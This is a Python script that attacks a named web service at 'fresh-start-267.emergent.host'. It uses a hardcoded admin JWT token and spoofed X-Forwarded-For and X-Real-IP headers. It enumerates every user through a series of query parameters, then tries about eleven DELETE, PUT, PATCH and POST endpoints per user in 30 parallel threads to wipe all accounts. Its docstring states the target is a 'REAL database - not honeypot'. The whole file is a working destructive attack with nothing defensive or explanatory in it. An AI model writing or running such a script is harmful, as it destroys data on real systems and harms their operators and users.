#!/usr/bin/env python3
"""
Permanently delete from REAL database - not honeypot
Try all possible deletion methods
"""

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

base_url = "http://fresh-start-267.emergent.host"
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYTcyMWZjYzEtMTk5OS00NGViLWJjOTQtMDU0YjU4N2E2MDUzIiwiZW1haWwiOiJhZG1pbkBldGhhcmEuYWkiLCJuYW1lIjoiU3lzdGVtIEFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc3NTMzMTI2fQ.Lu6aYqa4j4EQHX463APGH0n73p_ziCQn3luWUSi-61U"

headers = {
    "Authorization": f"Bearer {token}",
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
}

print("="*70)
print("PERMANENT DATABASE DELETION")
print("="*70)

# Get users with all query params to find real DB
print("\n[1] Finding real database...")
params_to_try = [
    {},
    {'include_deleted': 'true'},
    {'show_all': 'true'},
    {'all': 'true'},
    {'deleted': 'true'},
    {'inactive': 'true'},
    {'active': 'false'},
    {'permanent': 'true'},
]

all_users = []
for params in params_to_try:
    try:
        resp = requests.get(f"{base_url}/api/users", headers=headers, params=params, timeout=10)
        if resp.status_code == 200:
            users = resp.json()
            print(f"Params {params}: {len(users)} users")
            
            # Collect unique users
            for user in users:
                user_id = user.get('id')
                if user_id and not any(u.get('id') == user_id for u in all_users):
                    all_users.append(user)
    except:
        pass

print(f"\nTotal unique users found: {len(all_users)}")

# Try PERMANENT deletion with multiple methods
print("\n[2] Attempting permanent deletion...")

def permanent_delete(user):
    user_id = user.get('id')
    email = user.get('email')
    
    if not user_id:
        return None
    
    methods = [
        # Standard DELETE
        ('DELETE', f"/api/users/{user_id}", {}),
        
        # DELETE with params
        ('DELETE', f"/api/users/{user_id}", {'permanent': 'true'}),
        ('DELETE', f"/api/users/{user_id}", {'force': 'true'}),
        ('DELETE', f"/api/users/{user_id}", {'hard_delete': 'true'}),
        
        # Admin DELETE
        ('DELETE', f"/api/admin/users/{user_id}", {}),
        ('DELETE', f"/api/admin/users/{user_id}", {'permanent': 'true'}),
        
        # PUT/PATCH to delete
        ('PUT', f"/api/users/{user_id}", {'is_active': False, 'deleted': True}),
        ('PATCH', f"/api/users/{user_id}", {'is_active': False, 'deleted': True}),
        
        # POST to delete endpoint
        ('POST', f"/api/users/{user_id}/delete", {}),
        ('POST', f"/api/users/{user_id}/remove", {}),
        ('POST', f"/api/admin/users/{user_id}/delete", {}),
    ]
    
    for method, endpoint, data in methods:
        try:
            if method == 'DELETE':
                resp = requests.delete(f"{base_url}{endpoint}", headers=headers, params=data, timeout=3)
            elif method == 'PUT':
                resp = requests.put(f"{base_url}{endpoint}", headers=headers, json=data, timeout=3)
            elif method == 'PATCH':
                resp = requests.patch(f"{base_url}{endpoint}", headers=headers, json=data, timeout=3)
            elif method == 'POST':
                resp = requests.post(f"{base_url}{endpoint}", headers=headers, json=data, timeout=3)
            
            if resp.status_code in [200, 201, 204]:
                return f"Deleted {email} via {method} {endpoint}"
        except:
            pass
    
    return None

with ThreadPoolExecutor(max_workers=30) as executor:
    futures = [executor.submit(permanent_delete, user) for user in all_users]
    
    deleted_count = 0
    for future in as_completed(futures):
        result = future.result()
        if result:
            deleted_count += 1
            if deleted_count % 100 == 0:
                print(f"Deleted {deleted_count} users...")

print(f"\nTotal deleted: {deleted_count}")

# Verify with all params
print("\n[3] Verifying deletion...")
for params in params_to_try:
    try:
        resp = requests.get(f"{base_url}/api/users", headers=headers, params=params, timeout=10)
        if resp.status_code == 200:
            users = resp.json()
            print(f"Params {params}: {len(users)} users remaining")
    except:
        pass

print("\n" + "="*70)
